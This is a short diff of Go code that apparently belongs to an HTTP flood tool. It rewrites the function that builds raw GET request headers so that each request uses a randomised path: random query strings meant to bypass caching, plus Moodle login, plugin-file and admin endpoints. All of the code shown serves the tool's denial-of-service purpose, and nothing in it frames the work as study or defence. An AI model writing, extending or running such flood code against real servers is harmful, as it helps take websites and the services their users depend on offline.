@@ -89,16 +89,18 @@ func getuseragent() string {
 
 func getheader() string {
 	if rpath == true {
-		roption := rand.Intn(3)
-		if roption == 1 {
-			path = "/?=" + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + ".php"
-		} else if roption == 2 {
-			path = "/index.php"
-		} else if roption == 3 {
-			path = "/index.php?=" + strconv.Itoa(rand.Intn(200))
-		} else {
-			path = "/"
+		// RANDOM PATH OR CREATE MULTIPLE PATH
+		var roption = []string{
+			fmt.Sprintf("/?=%s%s%s%s%s.php", a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))]),
+			fmt.Sprintf("/?=%s%s%s%s%s", a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))]),
+			fmt.Sprintf("/login/index.php?=%s%s%s%s%s", a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))]),
+			"/index.php",
+			"/login/index.php",
+			"/admin/tool/mobile/mobile.webmanifest.php",
+			"/pluginfile.php",
+			"/",
 		}
+		path = roption[rand.Intn(len(roption))]
 	}
 	get_host := fmt.Sprintf("GET %s HTTP/1.1\r\nHost:%s:%d\r\n", path, ip, port)
 	connection := "Connection: keep-alive\r\n"
